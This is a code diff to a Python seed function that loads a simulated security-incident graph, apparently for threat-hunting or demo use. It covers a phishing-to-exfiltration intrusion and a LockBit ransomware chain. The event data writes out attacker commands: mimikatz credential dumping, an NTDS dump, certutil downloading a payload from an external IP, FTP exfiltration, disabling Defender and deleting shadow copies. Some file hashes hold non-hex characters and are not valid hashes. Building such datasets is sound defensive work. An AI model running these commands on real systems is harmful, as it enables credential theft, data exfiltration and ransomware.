@@ -46,26 +46,26 @@ def seed(session):
     # ================================================================
     hosts = [
         # ── Servers ──
-        {"id": "dc01", "name": "DC01", "ip": "10.10.1.1", "os": "Windows Server 2019",
+        {"id": "DC01", "name": "DC01", "ip": "10.10.1.1", "os": "Windows Server 2019",
          "role": "Domain Controller", "department": "IT", "criticality": "critical"},
-        {"id": "fs01", "name": "FS01", "ip": "10.10.1.10", "os": "Windows Server 2019",
+        {"id": "FS01", "name": "FS01", "ip": "10.10.1.10", "os": "Windows Server 2019",
          "role": "File Server", "department": "IT", "criticality": "high"},
-        {"id": "mail01", "name": "MAIL01", "ip": "10.10.1.20", "os": "Windows Server 2022",
+        {"id": "MAIL01", "name": "MAIL01", "ip": "10.10.1.20", "os": "Windows Server 2022",
          "role": "Exchange Server", "department": "IT", "criticality": "high"},
-        {"id": "web01", "name": "WEB01", "ip": "10.10.2.100", "os": "Ubuntu 22.04",
+        {"id": "WEB01", "name": "WEB01", "ip": "10.10.2.100", "os": "Ubuntu 22.04",
          "role": "Web Server", "department": "Engineering", "criticality": "medium"},
-        {"id": "db01", "name": "DB01", "ip": "10.10.2.101", "os": "Ubuntu 22.04",
+        {"id": "DB01", "name": "DB01", "ip": "10.10.2.101", "os": "Ubuntu 22.04",
          "role": "Database Server", "department": "Engineering", "criticality": "critical"},
         # ── Workstations ──
-        {"id": "wks01", "name": "WKS01", "ip": "10.10.3.50", "os": "Windows 11",
+        {"id": "WKS01", "name": "WKS01", "ip": "10.10.3.50", "os": "Windows 11",
          "role": "Workstation", "department": "Finance", "criticality": "medium"},
-        {"id": "wks02", "name": "WKS02", "ip": "10.10.3.51", "os": "Windows 11",
+        {"id": "WKS02", "name": "WKS02", "ip": "10.10.3.51", "os": "Windows 11",
          "role": "Workstation", "department": "HR", "criticality": "medium"},
-        {"id": "wks03", "name": "WKS03", "ip": "10.10.3.52", "os": "Windows 11",
+        {"id": "WKS03", "name": "WKS03", "ip": "10.10.3.52", "os": "Windows 11",
          "role": "Workstation", "department": "Engineering", "criticality": "low"},
-        {"id": "wks04", "name": "WKS04", "ip": "10.10.3.53", "os": "macOS Sonoma",
+        {"id": "WKS04", "name": "WKS04", "ip": "10.10.3.53", "os": "macOS Sonoma",
          "role": "Workstation", "department": "Executive", "criticality": "high"},
-        {"id": "wks05", "name": "WKS05", "ip": "10.10.3.54", "os": "Windows 11",
+        {"id": "WKS05", "name": "WKS05", "ip": "10.10.3.54", "os": "Windows 11",
          "role": "Workstation", "department": "Finance", "criticality": "medium"},
     ]
     for h in hosts:
@@ -104,9 +104,9 @@ def seed(session):
 
     # ── User → Host (USES) ──
     user_host = [
-        ("u_jchen", "wks01"), ("u_mwang", "wks02"), ("u_asmith", "wks03"),
-        ("u_lzhang", "wks04"), ("u_admin", "dc01"), ("u_svc_backup", "fs01"),
-        ("u_jchen", "wks05"),
+        ("u_jchen", "WKS01"), ("u_mwang", "WKS02"), ("u_asmith", "WKS03"),
+        ("u_lzhang", "WKS04"), ("u_admin", "DC01"), ("u_svc_backup", "FS01"),
+        ("u_jchen", "WKS05"),
     ]
     for uid, hid in user_host:
         session.run(
@@ -161,11 +161,11 @@ def seed(session):
             **v,
         )
     session.run(
-        "MATCH (h:Host {id: 'mail01'}), (v:Vulnerability {id: 'CVE-2024-21413'}) "
+        "MATCH (h:Host {id: 'MAIL01'}), (v:Vulnerability {id: 'CVE-2024-21413'}) "
         "CREATE (h)-[:HAS_VULNERABILITY {discovered: '2024-10-01'}]->(v)"
     )
     session.run(
-        "MATCH (h:Host {id: 'web01'}), (v:Vulnerability {id: 'CVE-2023-44228'}) "
+        "MATCH (h:Host {id: 'WEB01'}), (v:Vulnerability {id: 'CVE-2023-44228'}) "
         "CREATE (h)-[:HAS_VULNERABILITY {discovered: '2024-09-15'}]->(v)"
     )
 
@@ -243,54 +243,54 @@ def seed(session):
     # ── Phase 1: Initial Access — user opens phishing attachment ──
     procs_a = [
         {"id": "proc_outlook_jchen", "name": "outlook.exe", "pid": 4120,
-         "host_id": "wks01", "user_id": "u_jchen",
+         "host_id": "WKS01", "user_id": "u_jchen",
          "cmd": "outlook.exe", "timestamp": "2024-11-15T08:30:00Z"},
         {"id": "proc_payload_01", "name": "Q4_Benefits_Update.pdf.exe", "pid": 7744,
-         "host_id": "wks01", "user_id": "u_jchen",
+         "host_id": "WKS01", "user_id": "u_jchen",
          "cmd": "Q4_Benefits_Update.pdf.exe", "timestamp": "2024-11-15T08:45:12Z"},
         {"id": "proc_powershell_01", "name": "powershell.exe", "pid": 8812,
-         "host_id": "wks01", "user_id": "u_jchen",
+         "host_id": "WKS01", "user_id": "u_jchen",
          "cmd": "powershell.exe -nop -w hidden -enc UwB0AGEAcgB0AC0A...",
          "timestamp": "2024-11-15T08:45:18Z"},
         # ── Phase 2: C2 beacon ──
         {"id": "proc_beacon_01", "name": "svchost.exe", "pid": 9200,
-         "host_id": "wks01", "user_id": "u_jchen",
+         "host_id": "WKS01", "user_id": "u_jchen",
          "cmd": "C:\\Windows\\Temp\\svchost.exe (injected Cobalt Strike beacon)",
          "timestamp": "2024-11-15T08:46:00Z"},
         # ── Phase 3: Discovery ──
         {"id": "proc_whoami", "name": "whoami.exe", "pid": 9300,
-         "host_id": "wks01", "user_id": "u_jchen",
+         "host_id": "WKS01", "user_id": "u_jchen",
          "cmd": "whoami /all", "timestamp": "2024-11-15T09:10:00Z"},
         {"id": "proc_net_group", "name": "net.exe", "pid": 9310,
-         "host_id": "wks01", "user_id": "u_jchen",
+         "host_id": "WKS01", "user_id": "u_jchen",
          "cmd": "net group \"Domain Admins\" /domain", "timestamp": "2024-11-15T09:12:00Z"},
         {"id": "proc_nltest", "name": "nltest.exe", "pid": 9320,
-         "host_id": "wks01", "user_id": "u_jchen",
+         "host_id": "WKS01", "user_id": "u_jchen",
          "cmd": "nltest /dclist:acme.local", "timestamp": "2024-11-15T09:15:00Z"},
         # ── Phase 4: Credential Access (Mimikatz) ──
         {"id": "proc_mimikatz", "name": "m64.exe", "pid": 10200,
-         "host_id": "wks01", "user_id": "u_jchen",
+         "host_id": "WKS01", "user_id": "u_jchen",
          "cmd": "m64.exe sekurlsa::logonpasswords", "timestamp": "2024-11-15T10:30:00Z"},
         # ── Phase 5: Lateral Movement to DC ──
         {"id": "proc_psexec_dc", "name": "psexec.exe", "pid": 11000,
-         "host_id": "dc01", "user_id": "u_admin",
+         "host_id": "DC01", "user_id": "u_admin",
          "cmd": "psexec.exe \\\\DC01 -u admin -p *** cmd.exe",
          "timestamp": "2024-11-15T11:05:00Z"},
         {"id": "proc_ntds_dump", "name": "ntdsutil.exe", "pid": 11500,
-         "host_id": "dc01", "user_id": "u_admin",
+         "host_id": "DC01", "user_id": "u_admin",
          "cmd": "ntdsutil.exe \"ac i ntds\" \"ifm\" \"create full c:\\temp\\ntds\"",
          "timestamp": "2024-11-15T11:30:00Z"},
         # ── Phase 6: Lateral Movement to File Server ──
         {"id": "proc_smb_fs", "name": "explorer.exe", "pid": 12000,
-         "host_id": "fs01", "user_id": "u_admin",
+         "host_id": "FS01", "user_id": "u_admin",
          "cmd": "net use \\\\FS01\\C$ /user:admin", "timestamp": "2024-11-15T14:00:00Z"},
         # ── Phase 7: Data Staging & Exfiltration ──
         {"id": "proc_7zip", "name": "7z.exe", "pid": 12100,
-         "host_id": "fs01", "user_id": "u_admin",
+         "host_id": "FS01", "user_id": "u_admin",
          "cmd": "7z.exe a C:\\temp\\archive.7z C:\\shares\\finance\\*",
          "timestamp": "2024-11-16T01:00:00Z"},
         {"id": "proc_ftp_exfil", "name": "ftp.exe", "pid": 12200,
-         "host_id": "fs01", "user_id": "u_admin",
+         "host_id": "FS01", "user_id": "u_admin",
          "cmd": "ftp.exe -s:script.txt 91.234.99.12", "timestamp": "2024-11-16T02:30:00Z"},
     ]
     for p in procs_a:
@@ -337,23 +337,23 @@ def seed(session):
         {"id": "nc_c2_beacon", "src_ip": "10.10.3.50", "dst_ip": "185.220.101.34",
          "dst_port": 443, "protocol": "HTTPS", "bytes_sent": 1200, "bytes_recv": 45000,
          "timestamp": "2024-11-15T08:46:05Z", "description": "Cobalt Strike beacon check-in",
-         "src_host": "wks01", "process_id": "proc_beacon_01"},
+         "src_host": "WKS01", "process_id": "proc_beacon_01"},
         {"id": "nc_c2_periodic", "src_ip": "10.10.3.50", "dst_ip": "185.220.101.34",
          "dst_port": 443, "protocol": "HTTPS", "bytes_sent": 500, "bytes_recv": 12000,
          "timestamp": "2024-11-15T10:00:00Z", "description": "C2 heartbeat",
-         "src_host": "wks01", "process_id": "proc_beacon_01"},
+         "src_host": "WKS01", "process_id": "proc_beacon_01"},
         {"id": "nc_psexec_dc", "src_ip": "10.10.3.50", "dst_ip": "10.10.1.1",
          "dst_port": 445, "protocol": "SMB", "bytes_sent": 8500, "bytes_recv": 3200,
          "timestamp": "2024-11-15T11:04:00Z", "description": "PsExec to Domain Controller",
-         "src_host": "wks01", "process_id": "proc_psexec_dc"},
+         "src_host": "WKS01", "process_id": "proc_psexec_dc"},
         {"id": "nc_smb_fs", "src_ip": "10.10.1.1", "dst_ip": "10.10.1.10",
          "dst_port": 445, "protocol": "SMB", "bytes_sent": 1500, "bytes_recv": 890000,
          "timestamp": "2024-11-15T14:01:00Z", "description": "Admin share access to File Server",
-         "src_host": "dc01", "process_id": "proc_smb_fs"},
+         "src_host": "DC01", "process_id": "proc_smb_fs"},
         {"id": "nc_ftp_exfil", "src_ip": "10.10.1.10", "dst_ip": "91.234.99.12",
          "dst_port": 21, "protocol": "FTP", "bytes_sent": 524288000, "bytes_recv": 1200,
          "timestamp": "2024-11-16T02:30:00Z", "description": "Data exfiltration (500 MB)",
-         "src_host": "fs01", "process_id": "proc_ftp_exfil"},
+         "src_host": "FS01", "process_id": "proc_ftp_exfil"},
     ]
     for nc in net_conns_a:
         session.run(
@@ -395,19 +395,19 @@ def seed(session):
     files_a = [
         {"id": "file_payload", "name": "Q4_Benefits_Update.pdf.exe", "path": "C:\\Users\\jchen\\Downloads",
          "hash": "a3b8d1c9e2f4571b0c9e8d7a6f5b4e3c2d1a0f9e8b7c6d5e4f3a2b1c0d9e8f7",
-         "size_bytes": 284672, "created": "2024-11-15T08:45:10Z", "host_id": "wks01"},
+         "size_bytes": 284672, "created": "2024-11-15T08:45:10Z", "host_id": "WKS01"},
         {"id": "file_beacon", "name": "svchost.exe", "path": "C:\\Windows\\Temp",
          "hash": "b4c9e2d0f3a5682c1daf9e8b7d6c5f4e3b2a1c0f9e8d7b6a5f4e3d2c1b0a9e8",
-         "size_bytes": 312320, "created": "2024-11-15T08:45:55Z", "host_id": "wks01"},
+         "size_bytes": 312320, "created": "2024-11-15T08:45:55Z", "host_id": "WKS01"},
         {"id": "file_mimikatz", "name": "m64.exe", "path": "C:\\Users\\jchen\\AppData\\Local\\Temp",
          "hash": "f7e6d5c4b3a2019f8e7d6c5b4a3f2e1d0c9b8a7f6e5d4c3b2a1f0e9d8c7b6a5",
-         "size_bytes": 1247232, "created": "2024-11-15T10:29:00Z", "host_id": "wks01"},
+         "size_bytes": 1247232, "created": "2024-11-15T10:29:00Z", "host_id": "WKS01"},
         {"id": "file_ntds", "name": "ntds.dit", "path": "C:\\temp\\ntds",
          "hash": "c5d0a3e1f4b2693d2ebf0a9c8e7d6g5h4i3j2k1l0m9n8o7p6q5r4s3t2u1v0w9",
-         "size_bytes": 67108864, "created": "2024-11-15T11:35:00Z", "host_id": "dc01"},
+         "size_bytes": 67108864, "created": "2024-11-15T11:35:00Z", "host_id": "DC01"},
         {"id": "file_archive", "name": "archive.7z", "path": "C:\\temp",
          "hash": "d6e1b4f2a5c3704e3fcg1b0d9f8e7h6g5i4j3k2l1m0n9o8p7q6r5s4t3u2v1w0",
-         "size_bytes": 524288000, "created": "2024-11-16T01:45:00Z", "host_id": "fs01"},
+         "size_bytes": 524288000, "created": "2024-11-16T01:45:00Z", "host_id": "FS01"},
     ]
     for f in files_a:
         session.run(
@@ -427,42 +427,42 @@ def seed(session):
          "severity": "high", "source": "EDR",
          "description": "User jchen executed a .pdf.exe file from Outlook",
          "timestamp": "2024-11-15T08:45:15Z", "status": "open",
-         "host_id": "wks01", "technique_id": "T1566.001"},
+         "host_id": "WKS01", "technique_id": "T1566.001"},
         {"id": "alert_ps_enc", "name": "Encoded PowerShell Execution",
          "severity": "critical", "source": "EDR",
          "description": "Encoded PowerShell command launched by suspicious executable",
          "timestamp": "2024-11-15T08:45:20Z", "status": "open",
-         "host_id": "wks01", "technique_id": "T1059.001"},
+         "host_id": "WKS01", "technique_id": "T1059.001"},
         {"id": "alert_c2", "name": "Suspicious Outbound HTTPS to Known Threat IP",
          "severity": "critical", "source": "NDR",
          "description": "Connection to 185.220.101.34:443 — known Cobalt Strike C2",
          "timestamp": "2024-11-15T08:46:10Z", "status": "open",
-         "host_id": "wks01", "technique_id": "T1071.001"},
+         "host_id": "WKS01", "technique_id": "T1071.001"},
         {"id": "alert_discovery", "name": "Reconnaissance Command Sequence",
          "severity": "medium", "source": "EDR",
          "description": "whoami, net group, nltest executed in sequence",
          "timestamp": "2024-11-15T09:16:00Z", "status": "open",
-         "host_id": "wks01", "technique_id": "T1069.002"},
+         "host_id": "WKS01", "technique_id": "T1069.002"},
         {"id": "alert_cred_dump", "name": "LSASS Memory Access Detected",
          "severity": "critical", "source": "EDR",
          "description": "Process m64.exe accessed LSASS memory — credential dumping",
          "timestamp": "2024-11-15T10:30:05Z", "status": "open",
-         "host_id": "wks01", "technique_id": "T1003.001"},
+         "host_id": "WKS01", "technique_id": "T1003.001"},
         {"id": "alert_lat_mov_dc", "name": "Lateral Movement — PsExec to Domain Controller",
          "severity": "critical", "source": "EDR",
          "description": "PsExec used to execute code on DC01 from WKS01",
          "timestamp": "2024-11-15T11:05:05Z", "status": "open",
-         "host_id": "dc01", "technique_id": "T1021.002"},
+         "host_id": "DC01", "technique_id": "T1021.002"},
         {"id": "alert_ntds", "name": "NTDS.dit Access Detected",
          "severity": "critical", "source": "EDR",
          "description": "ntdsutil created IFM of Active Directory database",
          "timestamp": "2024-11-15T11:30:30Z", "status": "open",
-         "host_id": "dc01", "technique_id": "T1003.001"},
+         "host_id": "DC01", "technique_id": "T1003.001"},
         {"id": "alert_exfil", "name": "Large Outbound FTP Transfer to External IP",
          "severity": "critical", "source": "NDR",
          "description": "500 MB transferred via FTP to 91.234.99.12 at 02:30 AM",
          "timestamp": "2024-11-16T02:35:00Z", "status": "open",
-         "host_id": "fs01", "technique_id": "T1048.003"},
+         "host_id": "FS01", "technique_id": "T1048.003"},
     ]
     for a in alerts_a:
         session.run(
@@ -491,41 +491,41 @@ def seed(session):
     procs_b = [
         # Phase 1: RDP brute-force (external)
         {"id": "proc_rdp_brute", "name": "hydra", "pid": 0,
-         "host_id": "web01", "user_id": "u_asmith",
+         "host_id": "WEB01", "user_id": "u_asmith",
          "cmd": "External RDP brute-force from 45.134.26.77",
          "timestamp": "2024-12-01T03:00:00Z"},
         # Phase 2: RDP logon success
         {"id": "proc_rdp_session", "name": "rdpclip.exe", "pid": 6700,
-         "host_id": "web01", "user_id": "u_asmith",
+         "host_id": "WEB01", "user_id": "u_asmith",
          "cmd": "RDP session established from 45.134.26.77",
          "timestamp": "2024-12-01T04:12:00Z"},
         # Phase 3: Disable AV
         {"id": "proc_disable_av", "name": "powershell.exe", "pid": 7100,
-         "host_id": "web01", "user_id": "u_asmith",
+         "host_id": "WEB01", "user_id": "u_asmith",
          "cmd": "powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true",
          "timestamp": "2024-12-01T04:15:00Z"},
         # Phase 4: Download ransomware
         {"id": "proc_certutil", "name": "certutil.exe", "pid": 7200,
-         "host_id": "web01", "user_id": "u_asmith",
+         "host_id": "WEB01", "user_id": "u_asmith",
          "cmd": "certutil.exe -urlcache -split -f http://45.134.26.77/lb3.exe C:\\temp\\lb3.exe",
          "timestamp": "2024-12-01T04:18:00Z"},
         # Phase 5: Spread to DB server
         {"id": "proc_psexec_db", "name": "psexec.exe", "pid": 7400,
-         "host_id": "db01", "user_id": "u_asmith",
+         "host_id": "DB01", "user_id": "u_asmith",
          "cmd": "psexec.exe \\\\DB01 -u asmith cmd /c C:\\temp\\lb3.exe",
          "timestamp": "2024-12-01T04:30:00Z"},
         # Phase 6: Delete shadow copies
         {"id": "proc_vssadmin", "name": "vssadmin.exe", "pid": 7500,
-         "host_id": "web01", "user_id": "u_asmith",
+         "host_id": "WEB01", "user_id": "u_asmith",
          "cmd": "vssadmin.exe delete shadows /all /quiet",
          "timestamp": "2024-12-02T00:00:00Z"},
         # Phase 7: Encrypt files
         {"id": "proc_lockbit", "name": "lb3.exe", "pid": 7600,
-         "host_id": "web01", "user_id": "u_asmith",
+         "host_id": "WEB01", "user_id": "u_asmith",
          "cmd": "lb3.exe --encrypt-all --note ransom.txt",
          "timestamp": "2024-12-02T00:01:00Z"},
         {"id": "proc_lockbit_db", "name": "lb3.exe", "pid": 7700,
-         "host_id": "db01", "user_id": "u_asmith",
+         "host_id": "DB01", "user_id": "u_asmith",
          "cmd": "lb3.exe --encrypt-all --note ransom.txt",
          "timestamp": "2024-12-02T00:05:00Z"},
     ]
@@ -566,15 +566,15 @@ def seed(session):
         {"id": "nc_rdp_brute", "src_ip": "45.134.26.77", "dst_ip": "10.10.2.100",
          "dst_port": 3389, "protocol": "RDP", "bytes_sent": 50000, "bytes_recv": 12000,
          "timestamp": "2024-12-01T03:00:00Z", "description": "RDP brute-force (1200 attempts)",
-         "src_host": "web01", "process_id": "proc_rdp_brute"},
+         "src_host": "WEB01", "process_id": "proc_rdp_brute"},
         {"id": "nc_download_lb", "src_ip": "10.10.2.100", "dst_ip": "45.134.26.77",
          "dst_port": 80, "protocol": "HTTP", "bytes_sent": 200, "bytes_recv": 2097152,
          "timestamp": "2024-12-01T04:18:05Z", "description": "Ransomware download (2 MB)",
-         "src_host": "web01", "process_id": "proc_certutil"},
+         "src_host": "WEB01", "process_id": "proc_certutil"},
         {"id": "nc_lat_mov_db", "src_ip": "10.10.2.100", "dst_ip": "10.10.2.101",
          "dst_port": 445, "protocol": "SMB", "bytes_sent": 2097152, "bytes_recv": 500,
          "timestamp": "2024-12-01T04:30:05Z", "description": "PsExec to Database Server",
-         "src_host": "web01", "process_id": "proc_psexec_db"},
+         "src_host": "WEB01", "process_id": "proc_psexec_db"},
     ]
     for nc in net_conns_b:
         session.run(
@@ -614,42 +614,42 @@ def seed(session):
          "severity": "high", "source": "NDR",
          "description": "1200+ failed RDP login attempts from 45.134.26.77 to WEB01",
          "timestamp": "2024-12-01T03:30:00Z", "status": "open",
-         "host_id": "web01", "technique_id": "T1110.001"},
+         "host_id": "WEB01", "technique_id": "T1110.001"},
         {"id": "alert_rdp_success", "name": "Successful RDP Login After Brute-Force",
          "severity": "critical", "source": "SIEM",
          "description": "User asmith logged in via RDP from attacker IP 45.134.26.77",
          "timestamp": "2024-12-01T04:12:05Z", "status": "open",
-         "host_id": "web01", "technique_id": "T1078"},
+         "host_id": "WEB01", "technique_id": "T1078"},
         {"id": "alert_av_disabled", "name": "Windows Defender Disabled",
          "severity": "high", "source": "EDR",
          "description": "Real-time protection disabled via PowerShell",
          "timestamp": "2024-12-01T04:15:05Z", "status": "open",
-         "host_id": "web01", "technique_id": "T1059.001"},
+         "host_id": "WEB01", "technique_id": "T1059.001"},
         {"id": "alert_certutil", "name": "Certutil Used for File Download",
          "severity": "high", "source": "EDR",
          "description": "certutil.exe downloaded executable from external IP",
          "timestamp": "2024-12-01T04:18:10Z", "status": "open",
-         "host_id": "web01", "technique_id": "T1059.003"},
+         "host_id": "WEB01", "technique_id": "T1059.003"},
         {"id": "alert_lat_mov_db", "name": "Lateral Movement to Database Server",
          "severity": "critical", "source": "EDR",
          "description": "PsExec used to deploy executable to DB01",
          "timestamp": "2024-12-01T04:30:10Z", "status": "open",
-         "host_id": "db01", "technique_id": "T1021.002"},
+         "host_id": "DB01", "technique_id": "T1021.002"},
         {"id": "alert_shadow_del", "name": "Volume Shadow Copy Deletion",
          "severity": "critical", "source": "EDR",
          "description": "vssadmin delete shadows — ransomware recovery prevention",
          "timestamp": "2024-12-02T00:00:05Z", "status": "open",
-         "host_id": "web01", "technique_id": "T1490"},
+         "host_id": "WEB01", "technique_id": "T1490"},
         {"id": "alert_ransomware", "name": "Ransomware Encryption Activity Detected",
          "severity": "critical", "source": "EDR",
          "description": "Mass file encryption detected — LockBit 3.0 behavior",
          "timestamp": "2024-12-02T00:02:00Z", "status": "open",
-         "host_id": "web01", "technique_id": "T1486"},
+         "host_id": "WEB01", "technique_id": "T1486"},
         {"id": "alert_ransomware_db", "name": "Ransomware Encryption on DB Server",
          "severity": "critical", "source": "EDR",
          "description": "Mass file encryption detected on DB01",
          "timestamp": "2024-12-02T00:06:00Z", "status": "open",
-         "host_id": "db01", "technique_id": "T1486"},
+         "host_id": "DB01", "technique_id": "T1486"},
     ]
     for a in alerts_b:
         session.run(
@@ -671,15 +671,15 @@ def seed(session):
 
     # ── Host-to-Host lateral movement edges ──
     session.run("""
-        MATCH (a:Host {id: 'wks01'}), (b:Host {id: 'dc01'})
+        MATCH (a:Host {id: 'WKS01'}), (b:Host {id: 'DC01'})
         CREATE (a)-[:CONNECTED_TO {method: 'PsExec/SMB', timestamp: '2024-11-15T11:05:00Z'}]->(b)
     """)
     session.run("""
-        MATCH (a:Host {id: 'dc01'}), (b:Host {id: 'fs01'})
+        MATCH (a:Host {id: 'DC01'}), (b:Host {id: 'FS01'})
         CREATE (a)-[:CONNECTED_TO {method: 'Admin Share', timestamp: '2024-11-15T14:00:00Z'}]->(b)
     """)
     session.run("""
-        MATCH (a:Host {id: 'web01'}), (b:Host {id: 'db01'})
+        MATCH (a:Host {id: 'WEB01'}), (b:Host {id: 'DB01'})
         CREATE (a)-[:CONNECTED_TO {method: 'PsExec/SMB', timestamp: '2024-12-01T04:30:00Z'}]->(b)
     """)
 
